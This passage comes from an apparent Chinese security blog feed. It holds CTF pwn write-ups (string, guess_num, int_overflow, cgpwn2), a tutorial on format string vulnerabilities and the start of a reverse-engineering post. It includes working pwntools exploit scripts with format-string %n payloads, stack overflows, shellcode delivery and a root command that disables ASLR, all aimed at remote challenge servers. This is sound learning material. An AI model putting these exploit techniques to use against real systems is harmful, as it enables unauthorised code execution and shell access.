<span class="token keyword">print</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
<p>运行脚本 这里我的回显位是8</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H2ae5d11d296e408c933d80378f1273bfC.png" alt title class>
                <p></p>
            </figure>

<p>那么接下来就是写脚本利用格式化字符串漏洞了</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"48825"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"secret[0] is "</span><span class="token punctuation">)</span>
secret0<span class="token operator">=</span>int<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name be:"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"AAAA"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"So, where you will go?east or up?:"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"east"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"or leave(0)?:"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"'Give me an address'"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>secret0<span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"And, you wish is:"</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token string">"%85c%7$n"</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></code></pre>
<p>执行到这一步已经是利用过格式化字符串漏洞 将数组的值修改为一致的了</p>
<blockquote>
<p>%85c%7$n是个啥玩意</p>
<p>这样写是为了更方便的利用格式化字符串漏洞<br>我们都知道 格式化字符串是可以修改数据的值的 也就是利用%n前面字符数来修改<br>但是大部分情况下 都是需要填充十几个 甚至上百个字符 所以创造出了这种格式</p>
<p>格式:%需要修改成为的值c%回显位$格式化字符</p>
</blockquote>
<p>接下来就是输入shellcode了 这方面是菜鸡的短板…经过大佬知道学会了用pwntools生成shellcode</p>
<p>完整脚本如下</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"48825"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"secret[0] is "</span><span class="token punctuation">)</span>
secret0<span class="token operator">=</span>int<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name be:"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"AAAA"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"So, where you will go?east or up?:"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"east"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"or leave(0)?:"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"'Give me an address'"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>secret0<span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"And, you wish is:"</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token string">"%85c%7$n"</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"Wizard: I will help you! USE YOU SPELL"</span><span class="token punctuation">,</span>shellcode<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>运行脚本得到终端 自己cat flag即可</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H76c4f169f6624dbc8e598d09887a382bf.png" alt title class>
                <p></p>
            </figure>

<p>得到flag:cyberpeace{d35672c5e758a40ea0c05f6dbbe77015}</p>
<h2 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h2><p>老样子 查保护 看位数</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H1dcd4e82cae14e17b2130dbecfbab142m.png" alt title class>
                <p></p>
            </figure>

<p>保护开得很全… 先跑一下 先是输入名字 然后输出自己猜的数…果断GG掉了…那载入IDA吧…</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H9f1db03916794d03b4ed742e914b8381S.png" alt title class>
                <p></p>
            </figure>

<p>主函数很耿直 几乎没有跳转 跟进sub_C3E看下 发现就是cat flag 那么主要就是主函数的执行了</p>
<blockquote>
<p>刚开始菜鸡很是头疼 这个随机数怎么搞定 后来了解了下rand函数的具体原理</p>
<p>rand函数是伪随机函数 他每个”种子”对应一个固定的随机值 所以在使用rand函数之前会使用srand来随机生成一个种子</p>
</blockquote>
<p>仔细一看 哦吼..大胆的作者敢用gets读入..八成是溢出了..再配合srand函数的原理 很容易确定思路</p>
<p>先是利用溢出 覆盖掉种子的值 从而达到控制随机数的目的 那么就开始写脚本吧 首先确定偏移地址</p>
<p>双击v9进入栈图 我们的目的是覆盖seed的值</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/Hee09e00f48d64a8da1cf875c501952fbU.png" alt title class>
                <p></p>
            </figure>

<p>可以简单计算出偏移量是20 那么写出脚本即可</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>
sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"53030"</span><span class="token punctuation">)</span>
elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./guess"</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#print(elf.libc)</span>
libc<span class="token operator">=</span>cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
libc<span class="token punctuation">.</span>srand<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
      num<span class="token operator">=</span>str<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>
      sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'number:'</span><span class="token punctuation">)</span>
      sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>num<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<blockquote>
<p>这个脚本的关键就是如何在python中使用c的函数 我选择的解决方法是 使用ctypes库 </p>
<p>这个库可以方便我们直接在程序中使用C的函数 但是我们首先要确定libc共享库的版本号 这里我是用的是ldd指令进行的查询<br>如果懒的话也可以通过在程序中使用elf.libc来获取</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/Hbc247d86009a4a3cac2312c5f56843149.png" alt title class>
                <p></p>
            </figure>
</blockquote>
<p>运行脚本即可</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/Hb3290098e42744f7ae81df295cbd19ccc.png" alt title class>
                <p></p>
            </figure>

<p>得到flag:cyberpeace{de6b4ebe0aab9472c1dda38729fc76ef}</p>
<h2 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h2><figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H8e47c49cc69745ef8f0dd69edf28ec14I.png" alt title class>
                <p></p>
            </figure>

<p>先跑下 发现是一个类似登陆的系统 要求输入密码bulabula…没啥直接思路</p>
<p>32位的程序 丢进IDA看下程序流程</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H1e6e4439979b4a85a11b2a8ff19862ber.png" alt title class>
                <p></p>
            </figure>

<p>主函数还是一样的寂寞..什么有价值的都没有呢…但是在函数表里发现一个敏感函数what_is_this</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H3c6b0310b34e46738863aee4be442848Z.png" alt title class>
                <p></p>
            </figure>

<p>那起码能确定肯定是溢出类的题目了 最后劫持程序流向what_is_this函数</p>
<p>跟进login函数 也没啥发现 check函数主要就是录入了用户名和密码 本来看见read函数 以为溢出点就在这里了..打开栈图一看发现覆盖不到返回地址…继续向下跟进check_passwd函数</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H431013789c004197b1ef8984139dbefbQ.png" alt title class>
                <p></p>
            </figure>

<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/Hdf7b08d1a7d94d128d68c1a1df79bc7fC.png" alt title class>
                <p></p>
            </figure>

<p>简单解释下程序流程 这里的s就是之前我们录入的密码 check_passwd函数首先检测s的长度 要求s的长度在3到8之间</p>
<p>在走过if后 发现另外一个敏感函数 <kbd>strcpy</kbd> 这个函数一样不检测长度 可以直接覆盖无限大的空间..<br>查看一下栈图 dest函数到返回地址的距离是14个字节 但是我们的密码最多只能输入8位…这时候注意到题目名..整型溢出..百度了一下..</p>
<p>注意一下变量v3的定义方式 是一个八位的无符号整型数 也就是最大255 如果大于255 就会清零从头计数 那么基本思路就有了 简单来说就是将密码长度设为258-263位之间 同时对应好位置 直接把返回地址覆写即可</p>
<p>那么..日常码脚本..</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"34902"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your choice:"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your username:"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"Dust"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your passwd:"</span><span class="token punctuation">)</span>
elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./int_overflow"</span><span class="token punctuation">)</span>
what_is_this<span class="token operator">=</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'what_is_this'</span><span class="token punctuation">]</span>
payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>what_is_this<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xE7</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>运行脚本即可</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H646dc7782e7f4029a6dadd5251eda1f65.png" alt title class>
                <p></p>
            </figure>

<p>得到flag:cyberpeace{85f5a37cbe589f048f01f85b41e6f421}</p>
<h2 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h2><p>保护</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H291662a9388b451f96af988216f86aa5A.png" alt title class>
                <p></p>
            </figure>

<p>运行程序啥都看不出来 就让输入个用户名和留言 拖入IDA吧</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/He43b12a532d641dba8da9e19bcd2dc86d.png" alt title class>
                <p></p>
            </figure>

<p>主函数什么都没有 直接往下跟</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/Hec3d211d6b3c4119b1af6b27a21cf1feE.png" alt title class>
                <p></p>
            </figure>

<p>在hello函数的最后发现敏感函数gets 不用纠结函数上面写的是在干嘛..反正对函数主体以及我们的输入没有关系 不用管..同时在函数表中发现<kbd>system</kbd>函数 那么基本思路明确 通过gets函数劫持程序流向system函数 直接在栈里构造出来system函数调用<kbd>/bin/bash</kbd>的情况即可</p>
<p>接下来就是脚本了</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./cgpwn2"</span><span class="token punctuation">)</span>
sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"34584"</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#sh=process("./cgpwn2")</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"please tell me your name"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token string">"hello,you can leave some message here:"</span><span class="token punctuation">)</span>
sysaddr<span class="token operator">=</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
binaddr<span class="token operator">=</span><span class="token number">0x0804A080</span>
payload<span class="token operator">=</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x2A</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>sysaddr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>binaddr<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<blockquote>
<p>这里解释下脚本为什么在名字部分写入/bin/sh而binaddr又是什么东西<br>因为在编写脚本的时候 我们不可能直接将字符串写入栈 让system函数去调用 需要我们提前将/bin/sh写入程序 而上面的名字录入就是一个最好的位置</p>
<p>我们可以看一下name变量存在的位置</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H159c90dd87c9421292ac5b7a69ce4e34o.png" alt title class>
                <p></p>
            </figure>

<p>可以明确看到 name变量是存在bss段的静态变量 我们完全可以把/bin/sh先写入name变量 然后让system函数去调用</p>
</blockquote>
<p>执行脚本即可</p>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/Ha63ae34bd918413e852ef834e5940b7em.png" alt title class>
                <p></p>
            </figure>

<p>得到flag:cyberpeace{d0a41c2065b348cf58cbb94c96ee57e6}</p>
<h2 id="level-3"><a href="#level-3" class="headerlink" title="level_3"></a>level_3</h2><p>该题附件缺失 少了一个libc文件 没啥办法..略..</p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script></body></html>]]></content>
      
        
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[格式化字符串漏洞]]></title>
      <url>/2019/10/08/ge-shi-hua-zi-fu-chuan-lou-dong/</url>
      <content type="html"><![CDATA[<html><head></head><body><a id="more"></a>
<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>对于正常且安全的使用==printf函数==是这样操作的</p>
<pre><code>#include <stdio.h>

int main(void)
{
    int n=5;
    printf("%d",n);
    return 0;
}</code></pre><p>但是偏偏有些懒人喜欢偷懒 少打两个字写成这样子</p>
<pre><code>#include <stdio.h>

int main(void)
{
    char a[]="qwerdf";
    printf(a);
    return 0;
}</code></pre><p>对于printf函数来说 它的函数原型是</p>
<blockquote>
<p>printf(“格式化字符串”,参量1,参量2….)<br>如果输出成功返回输出的字数 如果输出失败则返回负数<br>格式化字符串 可以是以’%’开头的后跟特定字符来确定输出样式的 也可以是正常的字符串</p>
</blockquote>
<p>但是由于函数调用的关系 实参和形参结合的顺序是从左向右结合的 所以函数这样写也是可以正常输出的</p>
<figure class="image-box">
                <img src="https://img-blog.csdnimg.cn/20190923193449792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt title class>
                <p></p>
            </figure>以上代码 本身没有什么问题 但是如果用户可以控制输入的话 就会造成一些意想不到的结果

<pre><code>#include <stdio.h>
int main(void)
{
    char a[100];
    scanf("%s",a);
    printf(a);
    return 0;
 } </code></pre><figure class="image-box">
                <img src="https://img-blog.csdnimg.cn/20190923193909689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt title class>
                <p></p>
            </figure>
<p>我们可以通过测试发现 程序输出了一些奇怪的输出 我们载入x32dbg查看下 程序到底输出的是什么<br>通过观察栈中 我们发现 其实程序输出的就是栈中的数据</p>
<figure class="image-box">
                <img src="https://img-blog.csdnimg.cn/20190923195130178.png" alt title class>
                <p></p>
            </figure>
<p>造成这种结果的原因是 因为我们输入的%x 在我们用不安全的方式调用printf函数的时候 没有明确表示出哪里的参数是空缺的 这就会造成系统自动从左往右进行匹配 我们输入的%x 又正好是在 “格式化字符串” 这个参数内 系统就会将他当成默认的%x来进行输出</p>
<blockquote>
<p>同样的 如果我们输入的是%s 且在内存地址上正好有个字符串 我们就可以将内存中的字符串输出出来</p>
</blockquote>
<p>通过这种方式 我们就可以做到栈数据泄露</p>
<h2 id="内存读取"><a href="#内存读取" class="headerlink" title="内存读取"></a>内存读取</h2><blockquote>
<p>在进行以下版块的实验前 请先关闭掉Linux系统的PIE(空间分布随机化) 不然会造成程序变量地址一直在变动<br> 可以在==root==权限下 使用以下命令关闭<br>echo 0 > /proc/sys/kernel/randomize_va_space</p>
</blockquote>
<p>首先我们需要明确一点 所有的局部变量都是在栈中存放着 所以如果我们能泄露出来某个字符串的地址 我们就有机会直接读取到内存中这个字符串的值 </p>
<p>首先给出利用代码</p>
<blockquote>
<p>   关于如何写入地址的问题 菜鸡也不会在scanf的情况下写入地址 可能只有对照的ASCII码表进行输入了吧<br>所以在接下来的程序中 以命令行参数的形式向程序输入<br>因为 在命令行中 可以使用printf函数来将shellcode编码转换成字符</p>
</blockquote>
<pre><code>#include <stdio.h>
#include <string.h>
int main(int argc,char **argv)
{
    char a[100];
    strcpy(a,argv[1]);
    char flag[100]={"flag"};  
    printf("%p\n",flag);
    printf(a);
    printf("\n");
    return 0;
}</code></pre><p>在这里我们是直接将flag数组的地址直接输出出来 相当于泄露了关键字符串的地址吧…<br>因为==所有的局部变量都是存放在栈中的== 首先第一步就是需要遍历栈中数据找到输入的数据 以达到后面控制输入变量的目的</p>
<figure class="image-box">
                <img src="https://img-blog.csdnimg.cn/20190923212726366.png" alt title class>
                <p></p>
            </figure>这里发现栈中数据的第九位正好就是我们输入的数据 为了方便查看 也可以使用以下方式来查看第n位的回显

<blockquote>
<p>%< Number >$ formot string<br>注意此方法仅适用于Linux系统 且在命令行中使用需要转义$</p>
</blockquote>
<figure class="image-box">
                <img src="https://img-blog.csdnimg.cn/20190923213014599.png" alt title class>
                <p></p>
            </figure>
<p>在这里就可以控制输入的参数 将输入改为flag字符串的地址 同时根据上面所提过的 将%08x更改为%s直接读取到flag字符串具体的值</p>
<figure class="image-box">
                <img src="https://img-blog.csdnimg.cn/2019092321331572.png" alt title class>
                <p></p>
            </figure>
<p>根据以上操作 如果条件允许的话 就可以做到任意内存读取</p>
<h2 id="内存修改"><a href="#内存修改" class="headerlink" title="内存修改"></a>内存修改</h2><blockquote>
<p>首先先介绍一种不常见的 格式说明符’%n’ 它的作用并不是像%c %d那样说明格式 而是将%n之前的字符个数赋值给一个变量</p>
</blockquote>
<p>这里先给出实验代码</p>
<pre><code>#include <stdio.h>
#include <string.h>
int main(int argc,char **argv)
{
    char a[100];
    static int b=0;
    strcpy(a,argv[1]);
    printf("The addr of b is %p\n",&b);
    printf(a);
    printf("\n");
    printf("The value of b is %d\n",b);
    return 0;
}</code></pre><p>首先运行一次程序 可以得知静态变量b的地址 然后尝试查看回显位 这里我的回显位是第十位</p>
<figure class="image-box">
                <img src="https://img-blog.csdnimg.cn/20190924181656618.png" alt title class>
                <p></p>
            </figure>尝试在运行程序时 使用printf写入地址
<figure class="image-box">
                <img src="https://img-blog.csdnimg.cn/2019092418190293.png" alt title class>
                <p></p>
            </figure>
<p>此时就可以使用之前介绍过的 格式说明符%n了 %n将他自身前字符的个数 赋值给地址为0x5655700c的静态变量b 以达到修改内存中值的目的</p>
<figure class="image-box">
                <img src="https://img-blog.csdnimg.cn/2019092418215847.png" alt title class>
                <p></p>
            </figure>
<p>同样的 如果我们想将b的值修改的更大 只需要在 ‘%10$n’ 前增加对应数量的0即可 </p>
<figure class="image-box">
                <img src="https://img-blog.csdnimg.cn/20190924182308483.png" alt title class>
                <p></p>
            </figure>
<h2 id="格式化字符串的应用"><a href="#格式化字符串的应用" class="headerlink" title="格式化字符串的应用"></a>格式化字符串的应用</h2><blockquote>
<p>这里使用攻防世界 PWN模块的 CGfsb 作为例题</p>
</blockquote>
<p>首先载入IDA 通过阅读源码 发现关键判断 只要pwnme变量等于8 就能输出flag 同时发现程序崔仔格式化字符串漏洞 这里的条件和上面模块的条件类似</p>
<figure class="image-box">
                <img src="https://img-blog.csdnimg.cn/20190924184328449.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt title class>
                <p></p>
            </figure>
<p>双击pwnme变量 查看pwnme的具体地址 在得知了具体地址后 我们就可以开始写脚本了</p>
<figure class="image-box">
                <img src="https://img-blog.csdnimg.cn/20190924184625528.png" alt title class>
                <p></p>
            </figure>

<blockquote>
<p>这里需要介绍一款工具 pwntools 它是python的一个库 平时主要常用其中的模块有</p>
<ul>
<li>asm : 汇编与反汇编，支持x86/x64/arm/mips/powerpc等基本上所有的主流平台<ul>
<li>dynelf : 用于远程符号泄漏，需要提供leak方法</li>
<li>elf : 对elf文件进行操作</li>
<li>gdb : 配合gdb进行调试</li>
<li>memleak : 用于内存泄漏</li>
<li>shellcraft : shellcode的生成器</li>
<li>tubes : 包括tubes.sock, tubes.process, tubes.ssh, tubes.serialtube，分别适用于不同场景的PIPE</li>
<li>utils : 一些实用的小功能，例如CRC计算，cyclic pattern等</li>
</ul>
</li>
</ul>
<p>其中比较关键的函数有</p>
<ul>
<li>连接</li>
</ul>
<pre><code>#本地连接 a=process("程序路径")

#远程连接 a=remote("主机ip","端口号")

#关闭连接 a.close()</code></pre><ul>
<li>IO</li>
</ul>
<pre><code>#发送数据 
a.send("发送的数据")

#发送一行数据 相当于在数据后加个\n 
a.sendline("发送的数据“)

#接受数据
a.recv(numb=接受的字节数,timeout=指定超时时间)

#接受一行数据 keepends为是否保留结尾的\n 
a.recvline(keepends=?)

#接受数据直到我们设置的标志出现 
a.recvuntil("标志数据")

#一直接收数据 直到EOF 
a.recvall()

#持续接收直到EOF或者timeout 
a.recvrepeat(timeout=default)

#直接进行交互 相当于回到shell的模式 在取得sell之后使用 
a.interactive()</code></pre><p>如果需要继续深入的学习可以参考大佬的博客 <a href="https://www.jianshu.com/p/355e4badab50" target="_blank" rel="noopener">https://www.jianshu.com/p/355e4badab50</a></p>
</blockquote>
<pre><code>from pwn import *

#建立本地连接
sh=process("./example")

#设置标志接受
sh.recvline("please tell me your name:")

#回复程序以继续运行
sh.send("AAAA")

sh.recvline("leave your message please:")

#设置pwnme的地址 这里的p32是将数据转为小端存储
pwnme=p32(0x0804A068)

#输出payload修改pwnme的值
sh.send(pwnme+"0000%10$n")

#程序持续运行
sh.interactive()</code></pre><p>运行脚本 得到flag</p>
<figure class="image-box">
                <img src="https://img-blog.csdnimg.cn/20190924190754182.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt title class>
                <p></p>
            </figure>

<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script></body></html>]]></content>
      
        
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[逆向常见的算法]]></title>
      <url>/2019/10/08/ni-xiang-chang-jian-de-suan-fa/</url>
      <content type="html"><![CDATA[<html><head></head><body><a id="more"></a>

<h2 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h2><pre><code>对于Base64来说 是我们通常比较常见的加密算法 通常是应用 动态页面开发 或者是流媒体路径加密上 对于我这样的
菜鸡来说 通常常见于Web题中 但是在逆向题中也偶有见到</code></pre><p>Base64算法通俗的来讲就是 ==将3个8位字节转换为4个6位字节==</p>
